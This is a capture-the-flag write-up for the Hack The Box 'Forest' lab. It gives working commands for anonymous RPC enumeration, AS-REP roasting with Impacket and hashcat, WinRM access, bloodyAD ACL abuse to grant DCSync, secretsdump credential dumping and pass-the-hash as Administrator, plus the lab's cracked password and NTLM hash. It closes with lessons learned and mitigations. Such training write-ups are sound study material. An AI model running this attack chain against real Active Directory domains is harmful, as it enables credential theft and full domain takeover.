---
title: "Hack The Box - Forest - Writeup"
description: "Anonymous RPC enumeration, AS-REP Roasting, BloodHound privilege analysis, ACL abuse, and DCSync exploitation on HackTheBox Forest."

platform: "Hack The Box"
image: "/images/forest.png"
difficulty: "Easy"
draft: false

tags:
  - HackTheBox
  - Windows
  - Active Directory
  - AS-REP Roasting
  - BloodHound
  - DCSync
  - ACL Abuse
  - WinRM

categories:
  - HTB

ShowToc: true
TocOpen: true
ShowReadingTime: false
ShowBreadCrumbs: false
---

# Overview

Forest is a beginner-friendly Active Directory machine that focuses on domain enumeration, Kerberos abuse, BloodHound privilege analysis, and ACL exploitation.

The machine demonstrates how a low-privileged domain account can eventually lead to full Domain Administrator compromise through delegated Active Directory permissions.

---

# Skills & Concepts

* Active Directory Enumeration
* RPC Enumeration
* Kerberos Abuse
* AS-REP Roasting
* BloodHound Analysis
* ACL Abuse
* DCSync
* Pass-the-Hash
* Active Directory Privilege Escalation

---

# Tools Used

* Nmap
* rpcclient
* Impacket
* Hashcat
* Evil-WinRM
* BloodHound
* SharpHound
* BloodyAD

---

# Enumeration

## Nmap Scan

Initial service enumeration:

```bash
nmap -sVC -Pn 10.129.37.0
```

Results:

```text
53/tcp   open  domain       Simple DNS Plus
88/tcp   open  kerberos-sec Microsoft Windows Kerberos
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
5985/tcp open  http
```

The exposed services strongly suggested that the target was functioning as a Domain Controller.

Important observations:

* Kerberos exposed
* LDAP available
* SMB accessible
* WinRM enabled

---

# RPC Enumeration

Anonymous RPC enumeration was allowed on the target.

Using `rpcclient`, domain users could be enumerated without authentication:

```bash
rpcclient -U "" -N 10.129.37.0
```

Enumerating users:

```bash
enumdomusers
```

Interesting accounts discovered:

```text
sebastien
lucinda
svc-alfresco
andy
mark
santi
```

Among the enumerated users, `svc-alfresco` appeared to be a service account and became the primary target for further investigation.

---

# AS-REP Roasting

Enumerating Kerberos configuration revealed that the `svc-alfresco`
account had Kerberos pre-authentication disabled.

Accounts without Kerberos pre-authentication enabled are vulnerable to AS-REP Roasting, allowing attackers to request encrypted authentication material without valid credentials.

Using Impacket:

```bash
impacket-GetNPUsers htb.local/svc-alfresco -no-pass -dc-ip 10.129.37.0
```

Successful output:

```text
$krb5asrep$23$svc-alfresco@HTB.LOCAL:...
```

The account was confirmed to be vulnerable to AS-REP Roasting.

---

# Cracking the Hash

Using Hashcat:

```bash
hashcat -m 18200 svc-alfresco.hash /usr/share/wordlists/rockyou.txt
```

Recovered credentials:

```text
svc-alfresco:s3rvice
```

---

# WinRM Access

Using the recovered credentials, remote shell access was obtained through WinRM:

```bash
evil-winrm -u svc-alfresco -p 's3rvice' -i 10.129.37.0
```

Successful authentication granted PowerShell access to the target system.

---

# Privilege Escalation

## BloodHound Enumeration

![BloodHound Attack Path](/images/forest-bloodhound.png)

After obtaining an initial foothold, internal Active Directory enumeration was performed using SharpHound.

BloodHound analysis revealed the following privilege chain:

```text
Account Operators
        ↓ GenericAll
Exchange Windows Permissions
        ↓ WriteDacl
HTB.LOCAL Domain Object
```

The compromised `svc-alfresco` account was a member of `Account Operators`, which possessed `GenericAll` permissions over the `Exchange Windows Permissions` group.

The `Exchange Windows Permissions` group had `WriteDacl` rights over the domain object, making it possible to grant DCSync privileges to `svc-alfresco`.

---

# ACL Abuse

Adding `svc-alfresco` to the `Exchange Windows Permissions` group:

```bash
bloodyAD --host 10.129.37.0 \
-d htb.local \
-u svc-alfresco \
-p 's3rvice' \
add groupMember "EXCHANGE WINDOWS PERMISSIONS" "svc-alfresco"
```

Output:

```text
[+] svc-alfresco added to EXCHANGE WINDOWS PERMISSIONS
```

Granting DCSync privileges:

```bash
bloodyAD --host 10.129.37.0 \
-d htb.local \
-u svc-alfresco \
-p 's3rvice' \
add dcsync svc-alfresco
```

Output:

```text
[+] svc-alfresco is now able to DCSync
```

---

# DCSync Attack

With DCSync privileges assigned, domain password hashes could be replicated directly from the Domain Controller.

Using Impacket:

```bash
impacket-secretsdump htb.local/svc-alfresco:'s3rvice'@10.129.37.0
```

Administrator NTLM hash:

```text
Administrator:32693b11e6aa90eb43d32c72a07ceea6
```

At this stage, full domain compromise was achieved.

---

# Administrator Access

Using Pass-the-Hash authentication:

```bash
evil-winrm -i 10.129.37.0 \
-u Administrator \
-H 32693b11e6aa90eb43d32c72a07ceea6
```

Successful authentication resulted in Domain Administrator access.

---

# Attack Path Summary

```text
Anonymous RPC Enumeration
            ↓
User Discovery
            ↓
AS-REP Roasting
            ↓
Hash Cracking
            ↓
WinRM Access
            ↓
BloodHound Analysis
            ↓
ACL Abuse
            ↓
DCSync
            ↓
Domain Administrator
```

---

# Lessons Learned

Forest is an excellent introductory Active Directory machine because it demonstrates several core AD attack concepts in a realistic attack chain:

* Anonymous domain enumeration
* Kerberos abuse through AS-REP Roasting
* Internal privilege mapping with BloodHound
* ACL-based privilege escalation
* DCSync attacks
* Pass-the-Hash authentication

The machine also highlights the dangers of excessive delegated permissions and insecure Active Directory configurations inside enterprise environments.

---

# Mitigations

Several defensive measures could have prevented this compromise chain:

* Disable anonymous RPC enumeration
* Enforce Kerberos pre-authentication for all accounts
* Regularly audit Active Directory ACLs
* Restrict Exchange-related delegated permissions
* Monitor DCSync-related replication requests
* Limit WinRM access to administrative users only

---
